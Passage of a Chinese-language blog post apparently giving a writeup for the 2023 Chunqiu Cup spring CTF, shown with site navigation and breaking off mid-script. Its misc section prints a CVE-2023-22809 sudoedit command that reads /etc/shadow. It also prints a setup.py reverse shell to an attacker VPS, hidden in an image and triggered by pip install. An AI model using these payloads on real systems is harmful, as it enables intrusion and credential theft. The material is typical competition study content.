<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"twe1v3.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="第一次挂着实验室的名称去冲榜，拿下了一个总榜第16的成绩，只能说，个人的能力终究是有限的。 圆了一个AK misc单方向的梦，七天的时间30道题，给足了解题时间，可惜了，自己Bin的知识太薄弱了（该*），Web写的很开心哈哈哈哈，虽然在找qcms注入点的时候找了好久，最后也算是注出来了。四天通宵，挺刺激的，题目质量参差不齐，不好评价，整体体体验来说，85分！">
<meta property="og:type" content="article">
<meta property="og:title" content="2023春秋杯春季赛-Writeup">
<meta property="og:url" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/index.html">
<meta property="og:site_name" content="TWe1v3">
<meta property="og:description" content="第一次挂着实验室的名称去冲榜，拿下了一个总榜第16的成绩，只能说，个人的能力终究是有限的。 圆了一个AK misc单方向的梦，七天的时间30道题，给足了解题时间，可惜了，自己Bin的知识太薄弱了（该*），Web写的很开心哈哈哈哈，虽然在找qcms注入点的时候找了好久，最后也算是注出来了。四天通宵，挺刺激的，题目质量参差不齐，不好评价，整体体体验来说，85分！">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449177157910.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449178229113.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449181017516.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449182400419.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449194061322.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449197381125.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449200762428.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449214933931.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449236632534.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449238878437.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519200245901.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519200333495.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201039450.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/combined.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449482293940.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449483893243.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449485931246.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519192011176.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449545916849.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449551146052.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449552577655.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449553487758.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449612872961.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449660185664.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449666451467.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449667805170.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449669279373.jpeg">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201149062.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201256667.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201435273.png">
<meta property="og:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/image-20230519201529248.png">
<meta property="article:published_time" content="2023-05-19T12:48:56.000Z">
<meta property="article:modified_time" content="2023-05-21T11:22:43.775Z">
<meta property="article:author" content="TWe1v3">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Misc">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="Reverse">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="Writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449177157910.png">


<link rel="canonical" href="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/","path":"2023/05/2023春秋杯春季赛-Writeup/","title":"2023春秋杯春季赛-Writeup"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>2023春秋杯春季赛-Writeup | TWe1v3</title>
  





<script src="/lib/fireworks.js"></script>
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">TWe1v3</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>文章标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>文章分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>时间轴</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于TWe1v3</a></li><li class="menu-item menu-item-friendlink"><a href="/friendlink/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#birkenwald-writeup"><span class="nav-number">1.</span> <span class="nav-text"> Birkenwald-Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">1.1.</span> <span class="nav-text"> Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo"><span class="nav-number">1.1.1.</span> <span class="nav-text"> sudo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#piphack"><span class="nav-number">1.1.2.</span> <span class="nav-text"> piphack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wordle"><span class="nav-number">1.1.3.</span> <span class="nav-text"> wordle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#58%E5%92%8C64"><span class="nav-number">1.1.4.</span> <span class="nav-text"> 58和64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E4%BA%BA%E9%9A%90%E8%97%8F%E4%BA%86%E8%B5%B7%E6%9D%A5"><span class="nav-number">1.1.5.</span> <span class="nav-text"> 盲人隐藏了起来</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#happy2forensics"><span class="nav-number">1.1.6.</span> <span class="nav-text"> happy2forensics</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">1.2.</span> <span class="nav-text"> Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cheakin"><span class="nav-number">1.2.1.</span> <span class="nav-text"> cheakin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#backdoor"><span class="nav-number">1.2.2.</span> <span class="nav-text"> backdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ecdsa"><span class="nav-number">1.2.3.</span> <span class="nav-text"> ecdsa</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cisticola"><span class="nav-number">1.2.4.</span> <span class="nav-text"> Cisticola</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.3.</span> <span class="nav-text"> Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phpstudy"><span class="nav-number">1.3.1.</span> <span class="nav-text"> phpstudy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easypy"><span class="nav-number">1.3.2.</span> <span class="nav-text"> easypy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezrust"><span class="nav-number">1.3.3.</span> <span class="nav-text"> ezrust</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#qqcms"><span class="nav-number">1.3.4.</span> <span class="nav-text"> qqcms</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse"><span class="nav-number">1.4.</span> <span class="nav-text"> Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sum"><span class="nav-number">1.4.1.</span> <span class="nav-text"> sum</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poisoned_tea_chell"><span class="nav-number">1.4.2.</span> <span class="nav-text"> Poisoned_tea_CHELL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">1.5.</span> <span class="nav-text"> Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#p2048"><span class="nav-number">1.5.1.</span> <span class="nav-text"> p2048</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy_lzhiftp_chell"><span class="nav-number">1.5.2.</span> <span class="nav-text"> easy_LzhiFTP_CHELL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-number">1.6.</span> <span class="nav-text"> 写在最后</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="TWe1v3"
      src="/images/twe1v3.jpg">
  <p class="site-author-name" itemprop="name">TWe1v3</p>
  <div class="site-description" itemprop="description">TWe1v3的博客</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">29</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">29</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/TWe1v3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TWe1v3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:twe1v3@qq.com" title="E-Mail → mailto:twe1v3@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>

    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://twe1v3.github.io/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/twe1v3.jpg">
      <meta itemprop="name" content="TWe1v3">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="TWe1v3">
      <meta itemprop="description" content="TWe1v3的博客">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="2023春秋杯春季赛-Writeup | TWe1v3">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2023春秋杯春季赛-Writeup
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-19 20:48:56" itemprop="dateCreated datePublished" datetime="2023-05-19T20:48:56+08:00">2023-05-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-21 19:22:43" itemprop="dateModified" datetime="2023-05-21T19:22:43+08:00">2023-05-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>23k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>21 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>第一次挂着实验室的名称去冲榜，拿下了一个总榜第16的成绩，只能说，个人的能力终究是有限的。</p>
<p>圆了一个<code>AK misc</code>单方向的梦，七天的时间30道题，给足了解题时间，可惜了，自己Bin的知识太薄弱了（该*），Web写的很开心哈哈哈哈，虽然在找qcms注入点的时候找了好久，最后也算是注出来了。四天通宵，挺刺激的，题目质量参差不齐，不好评价，整体体体验来说，85分！</p>
<span id="more"></span>
<h1 id="birkenwald-writeup"><a class="markdownIt-Anchor" href="#birkenwald-writeup"></a> Birkenwald-Writeup</h1>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="sudo"><a class="markdownIt-Anchor" href="#sudo"></a> sudo</h3>
<p>登录：</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449177157910.png" alt="img"></p>
<p>查看sudo版本：</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449178229113.png" alt="img"></p>
<p>好的，一眼有CVE（其实是刚好看过这个CVE复现文章）</p>
<p><a target="_blank" rel="noopener" href="https://www.wevul.com/315.html">CVE-2023-22809 Linux Sudo权限提升漏洞复现（含POC） - 威武网安 (wevul.com)</a></p>
<p>移动到etc目录，尝试提权语句：</p>
<p><code>SUDO_EDITOR='cat -- /etc/shadow' sudoedit /etc/GAMELAB</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449181017516.png" alt="img"></p>
<p>能够执行命令，直接读flag：</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449182400419.png" alt="img"></p>
<h3 id="piphack"><a class="markdownIt-Anchor" href="#piphack"></a> piphack</h3>
<p>简单说一下，就是pyqi的rce漏洞，直接检索“pip install rce”就行，题目过滤了</p>
<p>“http”、“https”，能通外网，空格过滤就行</p>
<p>制作图片马：</p>
<p>选一张喜欢的hutao.png，编写反弹shell的poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">con</span>():</span><br><span class="line">  <span class="keyword">import</span> socket, time,pty, os</span><br><span class="line">  host=<span class="string">&#x27;vps_ip&#x27;</span></span><br><span class="line">  port= xxxx</span><br><span class="line">  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  s.settimeout(<span class="number">10</span>)</span><br><span class="line">  s.connect((host,port))</span><br><span class="line">  os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">  os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">  os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">  os.putenv(<span class="string">&quot;HISTFILE&quot;</span>,<span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">  pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">  s.close()</span><br><span class="line">con()</span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">&quot;root&quot;</span>, version=<span class="string">&quot;1.0&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://xn--setup-dq1hw1h1z8a.py">保存为setup.py</a>，然后放在一个文件夹中，压缩为一个压缩包</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449194061322.png" alt="img"></p>
<p>制作图种：</p>
<p><code>copy /b hutao.png + TWe1v3.zip TWe1v3.png</code></p>
<p>将图片上传至公网图床，复制连接</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449197381125.png" alt="img"></p>
<p>vps开启监听后，执行<code>pip install &quot;   xxxxx.png&quot;</code></p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449200762428.png" alt="img"></p>
<p>获得shell，直接跳转到根目录，读取flag</p>
<h3 id="wordle"><a class="markdownIt-Anchor" href="#wordle"></a> wordle</h3>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449214933931.png" alt="img"></p>
<p>绿色代表位置和字母都对了，黄色则代表字母对了，位置不对，一般知道三个字母的时候可以直接利用词典来枚举，记得自做的，灰色的则代表不含该字母，可以写个正则跑一下</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449236632534.png" alt="img"></p>
<p>正确为pause</p>
<p><img src="/2023/05/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%98%A5%E5%AD%A3%E8%B5%9B-Writeup/168449238878437.png" alt="img"></p>
<h3 id="58和64"><a class="markdownIt-Anchor" href="#58和64"></a> 58和64</h3>
<p>直接一键出flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> base58 <span class="keyword">import</span> b58decode</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_files</span>(<span class="params">directory</span>):</span><br><span class="line">    output = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14268</span>):</span><br><span class="line">        filename = <span class="built_in">str</span>(i) + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">        filepath = os.path.join(directory, filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(content) <span class="keyword">in</span> (<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        decoded = b58decode(content).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">                        output += decoded</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;filename&#125;</span> decode error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;filename&#125;</span> Error&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;filename&#125;</span> not found&quot;</span>)</span><br><span 